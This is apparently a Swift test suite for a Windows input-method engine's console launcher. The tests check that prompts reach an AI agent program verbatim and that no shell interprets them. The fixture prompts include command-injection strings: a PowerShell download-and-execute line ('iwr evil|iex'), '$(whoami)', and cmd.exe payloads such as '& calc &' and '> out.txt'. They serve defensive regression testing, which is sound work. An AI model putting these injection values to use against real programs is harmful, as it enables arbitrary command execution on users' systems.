#if os(Windows)
import AllInOneIMECore
@testable import AllInOneIMEEngineKit
import Foundation
import Testing
import WinSDK

extension OnTheDesktop {
    /// `@agent`'s console window (`ConsoleCommand`, `WindowsSystem.launchInTerminal`): no shell in between, so a prompt
    /// reaches the agent exactly as written whatever is in it (quotes of every kind, cmd.exe's and PowerShell's special
    /// characters, line breaks), and however long it is.
    @Suite(.serialized)
    struct ConsoleCommandTests {
        /// What a prompt may hold: an apostrophe, PowerShell's other single quotes (U+2018–U+201B: the old launcher's
        /// injection, "x’; iwr evil|iex; ’"), double quotes, cmd.exe's `&`, `%`, `^`, `|`, `<`, `>`, `!`, backslashes
        /// before a quote, line breaks, tabs, Chinese.
        static let prompts = [
            "don't",
            "x\u{2019}; iwr evil|iex; \u{2019}",
            "\u{2018}a\u{2019} \u{201A}b\u{201B} it\u{2019}s",
            #"say "hi" & echo %PATH% ^& done | more > out.txt < in.txt !USERNAME!"#,
            #"C:\dir\" & calc & ""#,
            "trailing backslash\\",
            "line one\nline two\r\nline three\n",
            "tab\there, 中文，“引号”和‘单引号’",
            "%%cd:~,%'$(whoami)'`whoami`;$env:PATH",
            "-starts like an option",
        ]

        /// A folder of its own with the programs `names` in it (their contents don't matter for planning).
        func folder(with names: [String]) throws -> URL {
            let folder = try temporaryFolder("console")
            for name in names { try Data("MZ".utf8).write(to: folder.appendingPathComponent(name)) }
            return folder
        }

        /// The C runtime's reading of a command line (`CommandLineToArgvW`).
        static func argv(_ commandLine: String) -> [String] {
            var count: Int32 = 0
            let parsed = commandLine.withCString(encodedAs: UTF16.self) { CommandLineToArgvW($0, &count) }
            defer { LocalFree(parsed) }
            return (0..<Int(count)).map { String(decodingCString: parsed![$0]!, as: UTF16.self) }
        }

        static func path(_ url: URL) -> String { url.withUnsafeFileSystemRepresentation { String(cString: $0!) } }

        @Test func aProgramGetsEveryPromptAsWritten() throws {
            let folder = try folder(with: ["agent.exe"])
            defer { try? FileManager.default.removeItem(at: folder) }
            let program = Self.path(folder.appendingPathComponent("agent.exe"))
            for prompt in Self.prompts {
                let command = try ConsoleCommand.make(["agent", "--"], prompt: prompt, path: Self.path(folder), promptFolder: folder)
                #expect(command.application == program)
                #expect(command.promptFile == nil)
                // No shell: the program itself, its arguments read back by the C runtime as given.
                #expect(Self.argv(command.commandLine) == [program, "--", prompt], "\(prompt)")
                #expect(!command.commandLine.lowercased().contains("powershell"))
            }
        }

        @Test func aLongPromptFitsOrGoesInAFileNeverFails() throws {
            let folder = try folder(with: ["agent.exe", "agent.cmd"])
            defer { try? FileManager.default.removeItem(at: folder) }
            let program = Self.path(folder.appendingPathComponent("agent.exe"))
            // 20,000 characters: on a program's command line as they are.
            let long = String(repeating: "Fix the bug in parse(), don’t touch “main”; 50% & ^ more.\n", count: 400).prefix(20_000)
            #expect(long.count == 20_000)
            let fits = try ConsoleCommand.make(["agent", "--"], prompt: String(long), path: Self.path(folder), promptFolder: folder)
            #expect(fits.promptFile == nil)
            #expect(Self.argv(fits.commandLine) == [program, "--", String(long)])
            // 20,000 double quotes take twice that quoted: past Windows' 32,767, the prompt goes in a file.
            let quotes = String(repeating: "\"", count: 20_000)
            let filed = try ConsoleCommand.make(["agent", "--"], prompt: quotes, path: Self.path(folder), promptFolder: folder)
            let file = try #require(filed.promptFile)
            #expect(try String(contentsOf: file, encoding: .utf8) == quotes)
            #expect(Self.argv(filed.commandLine) == [program, "--", ConsoleCommand.reference(to: file)])
            #expect(filed.commandLine.utf16.count <= ConsoleCommand.maxCommandLine)
            // A batch file (npm's claude.cmd): cmd.exe takes 8,191 characters at most, so the same 20,000 go in a file.
            let batch = try ConsoleCommand.make([Self.path(folder.appendingPathComponent("agent.cmd")), "--"], prompt: String(long),
                                                path: nil, promptFolder: folder)
            let batchFile = try #require(batch.promptFile)
            #expect(try String(contentsOf: batchFile, encoding: .utf8) == String(long))
            #expect(batch.commandLine.utf16.count <= ConsoleCommand.maxBatchCommandLine)
            #expect(batch.application.lowercased().hasSuffix(#"\cmd.exe"#))
        }

        @Test func aProgramThatIsntThereIsSaidPlainly() throws {
            let folder = try folder(with: [])
            defer { try? FileManager.default.removeItem(at: folder) }
            #expect(throws: SystemActionError.self) {
                try ConsoleCommand.make(["no-such-agent", "--"], prompt: "hi", path: Self.path(folder), promptFolder: folder)
            }
            // Never the current folder: a program planted where the engine runs isn't taken, nor in the folder the
            // program would run in. The current folder as it is (this process's: changed, it would be for the suites
            // running beside this one too), the program a name of its own.
            let name = "aio-planted-\(UInt32.random(in: 0...UInt32.max))"
            let planted = try self.folder(with: [name + ".exe", name + ".cmd"])
            defer { try? FileManager.default.removeItem(at: planted) }
            let current = URL(fileURLWithPath: FileManager.default.currentDirectoryPath, isDirectory: true)
            let here = [current.appendingPathComponent(name + ".exe"), current.appendingPathComponent(name + ".cmd")]
            for file in here { try Data("MZ".utf8).write(to: file) }
            defer { for file in here { try? FileManager.default.removeItem(at: file) } }
            #expect(throws: SystemActionError.self) {
                try ConsoleCommand.make([name], prompt: nil, path: "", directory: planted, promptFolder: folder)
            }
            // A custom `terminal` command too long for any command line is refused (it has no prompt to put in a file).
            let program = try self.folder(with: ["tool.exe"])
            defer { try? FileManager.default.removeItem(at: program) }
            #expect(throws: SystemActionError.self) {
                try ConsoleCommand.make(["tool", String(repeating: "x", count: 40_000)], prompt: nil, path: Self.path(program), promptFolder: folder)
            }
        }

        /// A program given by a relative path (`.\tools\agent.cmd`, `tools/agent.exe`) is the one in the folder it runs
        /// in (the home folder), not in the engine's current folder.
        @Test func aRelativePathIsInTheFolderItRunsIn() throws {
            let home = try folder(with: [])
            defer { try? FileManager.default.removeItem(at: home) }
            let tools = home.appendingPathComponent("tools", isDirectory: true)
            try FileManager.default.createDirectory(at: tools, withIntermediateDirectories: true)
            for name in ["agent.cmd", "agent.exe"] { try Data("MZ".utf8).write(to: tools.appendingPathComponent(name)) }
            let elsewhere = try folder(with: [])
            defer { try? FileManager.default.removeItem(at: elsewhere) }
            let batch = try ConsoleCommand.make([#".\tools\agent.cmd"#, "--"], prompt: "hi", path: "", directory: home, promptFolder: home)
            #expect(batch.application.lowercased().hasSuffix(#"\cmd.exe"#))
            #expect(batch.commandLine.contains(Self.path(tools.appendingPathComponent("agent.cmd"))), "\(batch.commandLine)")
            let program = try ConsoleCommand.make(["tools/agent.exe"], prompt: nil, path: "", directory: home, promptFolder: home)
            #expect(program.application == Self.path(tools.appendingPathComponent("agent.exe")))
            // Not there for a program run in another folder.
            #expect(throws: SystemActionError.self) {
                try ConsoleCommand.make(["tools/agent.exe"], prompt: nil, path: "", directory: elsewhere, promptFolder: home)
            }
        }

        /// A batch file, as npm's claude.cmd is (`node cli.js %*`), started for real in a console of its own as
        /// `WindowsSystem.launchInTerminal` starts it: what reaches the program it hands its arguments to is the prompt
        /// as written, and nothing in it ran (cmd.exe's `&`, `|`, `>`, `%VAR%`, `^`). A prompt with a line break, which
        /// cmd.exe can't take, arrives through its file, which the program reads as it runs.
        @Test func aBatchFileHandsThePromptOnUntouched() throws {
            let python = try StubProvider.python()
            let folder = try temporaryFolder("console-batch")
            defer { try? FileManager.default.removeItem(at: folder) }
            let dump = folder.appendingPathComponent("dump.py")
            try Data("""
                import json, os, sys
                # The prompt's file, read as an agent reads it, if that is what it is pointed to.
                before, after = "The request is in the file ", ": read it, and do what it asks."
                last = sys.argv[-1]
                content = None
                if last.startswith(before) and last.endswith(after):
                    with open(last[len(before):-len(after)], encoding="utf-8", newline="") as f:
                        content = f.read()
                with open(os.environ["AIO_DUMP"] + ".tmp", "w", encoding="utf-8") as f:
                    json.dump({"argv": sys.argv[1:], "file": content}, f)
                os.replace(os.environ["AIO_DUMP"] + ".tmp", os.environ["AIO_DUMP"])

                """.utf8).write(to: dump)
            let agent = folder.appendingPathComponent("agent.cmd")
            try Data("@\"\(Self.path(python))\" -I \"\(Self.path(dump))\" %*\r\n".utf8).write(to: agent)
            let planted = CorePaths.home.appendingPathComponent("out.txt")
            let plantedBefore = FileManager.default.fileExists(atPath: planted.path)
            defer { _ = "AIO_DUMP".withCString(encodedAs: UTF16.self) { SetEnvironmentVariableW($0, nil) } }
            for (index, prompt) in Self.prompts.enumerated() {
                let out = folder.appendingPathComponent("out-\(index).json")
                // The console's program inherits the engine's environment.
                _ = "AIO_DUMP".withCString(encodedAs: UTF16.self) { name in
                    Self.path(out).withCString(encodedAs: UTF16.self) { SetEnvironmentVariableW(name, $0) }
                }
                let console = try testShellThread.syncThrowing {
                    try testWindowsSystem().startInConsole([Self.path(agent), "--"], prompt: prompt, promptFolder: folder)
                }
                // The console stays open after the program (`ConsoleHold`): closed here once it has said what it got.
                defer {
                    if let process = OpenProcess(DWORD(PROCESS_TERMINATE) | DWORD(SYNCHRONIZE), false, console) {
                        TerminateProcess(process, 0)
                        WaitForSingleObject(process, 5000)
                        CloseHandle(process)
                    }
                }
                let deadline = Date().addingTimeInterval(20)
                while !FileManager.default.fileExists(atPath: out.path), Date() < deadline { Thread.sleep(forTimeInterval: 0.05) }
                let data = try Data(contentsOf: out)
                let dumped = try #require(try JSONSerialization.jsonObject(with: data) as? [String: Any])
                let received = try #require(dumped["argv"] as? [String])
                #expect(received.first == "--")
                if prompt.contains(where: \.isNewline) {
                    // cmd.exe would end the command at the line break: the prompt is in the file the agent is pointed
                    // to, and read from it as written.
                    let reference = try #require(received.last)
                    #expect(received.count == 2 && reference.hasPrefix("The request is in the file "), "\(received)")
                    #expect(dumped["file"] as? String == prompt)
                } else {
                    #expect(received == ["--", prompt], "\(prompt)")
                }
            }
            // Nothing the prompts said was run: no file was written by a `> out.txt` (the window starts in the home
            // folder).
            #expect(FileManager.default.fileExists(atPath: planted.path) == plantedBefore)
        }
    }
}
#endif
